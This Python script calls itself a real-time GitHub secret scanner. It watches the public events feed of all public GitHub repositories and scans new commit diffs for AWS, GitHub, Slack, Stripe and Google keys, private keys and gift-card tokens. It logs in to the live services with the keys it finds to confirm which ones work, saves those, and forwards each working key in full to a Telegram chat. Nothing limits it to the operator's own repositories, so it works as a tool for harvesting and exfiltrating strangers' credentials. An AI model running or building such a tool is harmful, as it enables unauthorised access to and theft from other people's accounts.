#!/usr/bin/env python3
"""
Real-time GitHub Secret Scanner
Ingestion → Pattern Matching → Verification
"""

import asyncio
import aiohttp
import logging
import re
import math
import time
from collections import defaultdict
from typing import List, Dict, Tuple, Optional
import json
import sys
import os
import requests   # added for Telegram notifications

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
def send_telegram(msg: str):
    """Send a message via Telegram bot (non-blocking, ignore errors)."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": msg,
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass   # Don't crash the scanner if Telegram fails

# ---------------------------- CONFIG ----------------------------
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN") or os.environ.get("CUSTOM_GITHUB_TOKEN")        # REQUIRED for 5000 req/hr
EVENTS_POLL_INTERVAL = 2                    # seconds between polling
LAST_EVENT_ID_FILE = "last_event_id.txt"   # persist to avoid duplicates (fallback if no env vars)
VERIFY_CONCURRENCY = 10                    # max concurrent verifications
LOG_FILE = "live_keys.log"                 # where valid keys are saved

# Entropy threshold (bits per character)
ENTROPY_THRESHOLD = 3.8
MIN_ENTROPY_STRING_LENGTH = 16
MAX_ENTROPY_STRING_LENGTH = 128

# Stateless mode: set via environment variables for GitHub Actions
SCAN_FROM_TIMESTAMP = os.getenv('SCAN_FROM_TIMESTAMP')  # ISO format: 2026-01-15T10:30:00Z
SCAN_TO_TIMESTAMP = os.getenv('SCAN_TO_TIMESTAMP')      # ISO format (optional, defaults to now)
STATELESS_MODE = SCAN_FROM_TIMESTAMP is not None       # True if env vars provided

# -------------------- PATTERNS & VERIFIERS ---------------------
# Each pattern: (regex, service_name, verifier_function_name)
# We'll define verifier functions below
PATTERNS = [
    # AWS Access Key ID
    (r'(?:A3T[A-Z0-9]|AKIA|ASIA)[A-Z0-9]{16}', 'AWS Access Key', 'verify_aws'),
    # AWS Secret Access Key (in code, often base64)
    (r'(?i)aws(.{0,20})?(?-i)["\']([0-9a-zA-Z\/+]{40})["\']', 'AWS Secret Key', 'verify_aws_secret'),
    # GitHub Personal Access Token
    (r'(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}', 'GitHub Token', 'verify_github'),
    # Slack Bot Token
    (r'xox[baprs]-[a-zA-Z0-9-]+', 'Slack Token', 'verify_slack'),
    # Stripe Live Key
    (r'sk_live_[0-9a-zA-Z]{24,}', 'Stripe Live Key', 'verify_stripe'),
    # Google API Key
    (r'AIza[0-9A-Za-z\-_]{35}', 'Google API Key', 'verify_google'),
    # Generic private key header (PEM)
    (r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----', 'Private Key', 'generic_alert'),
    # Your hypothetical giftcard key pattern
    (r'(?i)(giftcard|reward|loyalty)(_key|_token|secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{32,64})["\']',
     'Gift Card Key', 'generic_alert'),
]

# ----------------------- LOGGING SETUP -------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# -------------------- TIMESTAMP UTILITIES ---------------------
def parse_timestamp(ts_str: str) -> int:
    """Convert ISO format or Unix timestamp string to Unix timestamp (seconds)."""
    if not ts_str:
        return 0
    try:
        if ts_str.isdigit():
            return int(ts_str)
        from datetime import datetime
        dt = datetime.fromisoformat(ts_str.replace('Z', '+00:00'))
        return int(dt.timestamp())
    except:
        logger.warning(f"Failed to parse timestamp: {ts_str}, using 0")
        return 0

# ------------------- VERIFICATION ENDPOINTS --------------------
# These are non‑destructive checks (e.g., get user info, not create resources)
VERIFICATION_ENDPOINTS = {
    'aws': 'https://sts.amazonaws.com?Action=GetCallerIdentity&Version=2011-06-15',
    'slack_auth_test': 'https://slack.com/api/auth.test',
    'github_user': 'https://api.github.com/user',
    'stripe_balance': 'https://api.stripe.com/v1/balance',
    'google_cloud': 'https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=',
}

# -------------------- SHANNON ENTROPY --------------------------
def shannon_entropy(data: str) -> float:
    """Calculate entropy of a string (bits per character)."""
    if not data:
        return 0.0
    entropy = 0.0
    for x in range(256):
        p_x = data.count(chr(x)) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log2(p_x)
    return entropy

# --------------------- PATTERN MATCHING -------------------------
def extract_strings_from_diff(diff_text: str) -> List[str]:
    """Extract interesting tokens from added lines (lines starting with '+')."""
    candidates = []
    for line in diff_text.split('\n'):
        if line.startswith('+') and not line.startswith('+++'):
            # Remove the leading '+'
            content = line[1:].strip()
            # Use regex to extract quoted strings and standalone tokens
            # Tokenize: take words that are alphanum + common symbols
            tokens = re.findall(r'["\']([^"\']{16,})["\']|\b([A-Za-z0-9_\-+/=]{16,})\b', content)
            for t in tokens:
                # t is a tuple with either quoted or unquoted match
                token = t[0] if t[0] else t[1]
                if len(token) >= MIN_ENTROPY_STRING_LENGTH:
                    candidates.append(token)
    return candidates

def apply_regex_and_entropy(diff_text: str) -> List[Dict]:
    """
    Apply regex patterns and entropy analysis on the diff.
    Returns list of findings: { 'token': str, 'service': str, 'pattern': str }
    """
    findings = []

    # 1. Regex patterns
    for pattern, service, verifier in PATTERNS:
        matches = re.findall(pattern, diff_text, re.IGNORECASE | re.MULTILINE)
        for match in matches:
            if isinstance(match, tuple):
                # For patterns with capture groups, take the last non-empty group
                token = next((m for m in match if m and len(m) > 10), None)
                if not token:
                    continue
            else:
                token = match
            if token:
                findings.append({'token': token, 'service': service, 'verifier': verifier})

    # 2. Shannon entropy on extracted strings not already matched
    already_checked = set(f['token'] for f in findings)
    potential_strings = extract_strings_from_diff(diff_text)
    for token in potential_strings:
        if token in already_checked or len(token) > MAX_ENTROPY_STRING_LENGTH:
            continue
        entropy = shannon_entropy(token)
        if entropy >= ENTROPY_THRESHOLD:
            findings.append({'token': token, 'service': 'High Entropy String', 'verifier': 'generic_alert'})
            logger.debug(f"High entropy string: {token[:20]}... (entropy {entropy:.2f})")

    return findings

# --------------- INGESTION ENGINE (GitHub API) ----------------
class GitHubIngestion:
    def __init__(self, token: str):
        self.token = token
        self.session = None
        self.last_event_id = None
        self.timestamp_from = parse_timestamp(SCAN_FROM_TIMESTAMP) if STATELESS_MODE else None
        self.timestamp_to = parse_timestamp(SCAN_TO_TIMESTAMP) if SCAN_TO_TIMESTAMP else None
        if not STATELESS_MODE:
            self.load_last_event_id()
        else:
            logger.info(f"Running in STATELESS mode: from {SCAN_FROM_TIMESTAMP} to {SCAN_TO_TIMESTAMP or 'now'}")

    def load_last_event_id(self):
        try:
            with open(LAST_EVENT_ID_FILE, 'r') as f:
                self.last_event_id = int(f.read().strip())
        except:
            self.last_event_id = 0

    def save_last_event_id(self, event_id: int):
        if not STATELESS_MODE:
            with open(LAST_EVENT_ID_FILE, 'w') as f:
                f.write(str(event_id))

    async def _init_session(self):
        if not self.session:
            timeout = aiohttp.ClientTimeout(total=60, connect=30)
            self.session = aiohttp.ClientSession(
                headers={'Authorization': f'token {self.token}',
                         'Accept': 'application/vnd.github.v3+json'},
                timeout=timeout
            )

    async def fetch_events(self) -> List[dict]:
        """Poll GitHub Events API, return new PushEvents since last seen ID or timestamp."""
        await self._init_session()
        url = 'https://api.github.com/events'
        params = {'per_page': 100}
        max_retries = 3
        events = []
        for attempt in range(max_retries):
            try:
                async with self.session.get(url, params=params) as resp:
                    if resp.status == 403 and resp.headers.get('X-RateLimit-Remaining') == '0':
                        reset_time = int(resp.headers.get('X-RateLimit-Reset', time.time() + 60))
                        sleep_time = max(reset_time - time.time(), 1)
                        logger.warning(f"Rate limited, sleeping for {sleep_time} seconds")
                        await asyncio.sleep(sleep_time)
                        return []
                    if resp.status != 200:
                        logger.error(f"Events API returned {resp.status}")
                        return []
                    events = await resp.json()
                    break   # success
            except (asyncio.TimeoutError, aiohttp.ClientError) as e:
                logger.warning(f"Attempt {attempt+1}/{max_retries} failed: {e}")
                if attempt == max_retries - 1:
                    return []
                await asyncio.sleep(2 ** attempt)  # backoff: 1,2,4 seconds

        new_events = []
        for event in events:
            if STATELESS_MODE:
                event_ts = int(time.time()) if 'created_at' not in event else int(
                    time.mktime(time.strptime(event['created_at'], '%Y-%m-%dT%H:%M:%SZ'))
                )
                if event_ts < self.timestamp_from:
                    continue
                if self.timestamp_to and event_ts > self.timestamp_to:
                    continue
            else:
                if int(event['id']) <= self.last_event_id:
                    continue
            if event['type'] == 'PushEvent':
                new_events.append(event)

        if events and not STATELESS_MODE:
            self.last_event_id = max(self.last_event_id, int(events[0]['id']))
            self.save_last_event_id(self.last_event_id)
        return new_events

    async def get_commit_diff(self, repo_name: str, commit_sha: str) -> Optional[str]:
        """Retrieve diff for a single commit."""
        await self._init_session()
        url = f'https://api.github.com/repos/{repo_name}/commits/{commit_sha}'
        headers = {'Accept': 'application/vnd.github.v3.diff'}
        max_retries = 2
        for attempt in range(max_retries):
            try:
                async with self.session.get(url, headers=headers) as resp:
                    if resp.status == 403 and resp.headers.get('X-RateLimit-Remaining') == '0':
                        reset_time = int(resp.headers.get('X-RateLimit-Reset', time.time() + 60))
                        sleep_time = max(reset_time - time.time(), 1)
                        logger.warning(f"Rate limited, sleeping {sleep_time}s")
                        await asyncio.sleep(sleep_time)
                        return None
                    if resp.status == 200:
                        return await resp.text()
                    else:
                        logger.warning(f"Diff fetch failed {repo_name}@{commit_sha}: {resp.status}")
                        return None
            except (asyncio.TimeoutError, aiohttp.ClientError) as e:
                logger.warning(f"Diff attempt {attempt+1} failed: {e}")
                if attempt == max_retries - 1:
                    return None
                await asyncio.sleep(1)
        return None

    async def process_push_event(self, event: dict) -> List[dict]:
        """Extract all commit diffs from a PushEvent and scan each."""
        findings = []
        repo_name = event['repo']['name']
        commits = event['payload'].get('commits', [])
        for commit in commits:
            sha = commit['sha']
            diff_text = await self.get_commit_diff(repo_name, sha)
            if diff_text:
                logger.debug(f"Scanning {repo_name}@{sha}")
                commit_findings = apply_regex_and_entropy(diff_text)
                if commit_findings:
                    logger.info(f"  Found {len(commit_findings)} candidate(s) in {repo_name}@{sha[:7]}")
                for f in commit_findings:
                    f['repo'] = repo_name
                    f['commit'] = sha
                findings.extend(commit_findings)
            await asyncio.sleep(0.1)  # be gentle to API
        return findings

    async def close(self):
        if self.session:
            await self.session.close()

# --------------- VERIFICATION ENGINE ---------------------------
class Verifier:
    def __init__(self, concurrency: int = 10):
        self.semaphore = asyncio.Semaphore(concurrency)
        self.session = None

    async def _init_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession()

    async def verify_aws(self, key: str) -> bool:
        return None  

    async def verify_aws_secret(self, key_pair: str) -> bool:
        return None

    async def verify_github(self, token: str) -> bool:
        await self._init_session()
        async with self.semaphore:
            try:
                headers = {'Authorization': f'token {token}'}
                async with self.session.get('https://api.github.com/user', headers=headers) as resp:
                    return resp.status == 200
            except:
                return False

    async def verify_slack(self, token: str) -> bool:
        await self._init_session()
        async with self.semaphore:
            try:
                headers = {'Authorization': f'Bearer {token}'}
                async with self.session.post('https://slack.com/api/auth.test', headers=headers) as resp:
                    data = await resp.json()
                    return data.get('ok', False)
            except:
                return False

    async def verify_stripe(self, key: str) -> bool:
        await self._init_session()
        async with self.semaphore:
            try:
                headers = {'Authorization': f'Bearer {key}'}
                async with self.session.get('https://api.stripe.com/v1/balance', headers=headers) as resp:
                    return resp.status == 200
            except:
                return False

    async def verify_google(self, key: str) -> bool:
        await self._init_session()
        async with self.semaphore:
            try:
                params = {'access_token': key}
                async with self.session.get('https://www.googleapis.com/oauth2/v1/tokeninfo',
                                            params=params) as resp:
                    return resp.status == 200
            except:
                return False

    async def generic_alert(self, key: str) -> None:
        return None

    async def verify(self, finding: dict) -> Optional[bool]:
        verifier_name = finding['verifier']
        if hasattr(self, verifier_name):
            return await getattr(self, verifier_name)(finding['token'])
        return None

    async def close(self):
        if self.session:
            await self.session.close()

# ------------------------- MAIN LOOP ---------------------------
async def main():
    if GITHUB_TOKEN == "YOUR_GITHUB_TOKEN" or not GITHUB_TOKEN:
        logger.error("Please set GITHUB_TOKEN environment variable!")
        return

    ingestion = GitHubIngestion(GITHUB_TOKEN)
    verifier = Verifier(VERIFY_CONCURRENCY)
    live_keys_file = open(LOG_FILE, 'a', buffering=1)  # line buffered

    mode = "stateless (single-run)" if STATELESS_MODE else "continuous polling"
    logger.info(f"Starting GitHub secret scanner in {mode} mode...")
    try:
        while True:
            events = await ingestion.fetch_events()
            if events:
                logger.info(f"Processing {len(events)} new PushEvents")
                for event in events:
                    findings = await ingestion.process_push_event(event)
                    if not findings:
                        continue
                    logger.info(f"Found {len(findings)} candidate secrets in {event['repo']['name']}")

                    verifications = await asyncio.gather(
                        *[verifier.verify(f) for f in findings],
                        return_exceptions=True
                    )
                    for finding, is_valid in zip(findings, verifications):
                        if isinstance(is_valid, bool) and is_valid:
                            alert = f"[LIVE KEY] {finding['service']}: {finding['token']} (repo: {finding['repo']}, commit: {finding['commit']})"
                            logger.warning(alert)
                            live_keys_file.write(json.dumps(finding) + '\n')
                            # Send Telegram notification
                            send_telegram(alert)
                        elif is_valid is None:
                            alert = f"[UNKNOWN] {finding['service']}: {finding['token']}"
                            logger.info(alert)
            else:
                logger.debug("No new events")

            if STATELESS_MODE:
                logger.info("Stateless run complete, exiting.")
                break
            await asyncio.sleep(EVENTS_POLL_INTERVAL)
    except KeyboardInterrupt:
        logger.info("Shutting down...")
    finally:
        await ingestion.close()
        await verifier.close()
        live_keys_file.close()

if __name__ == '__main__':
    asyncio.run(main())
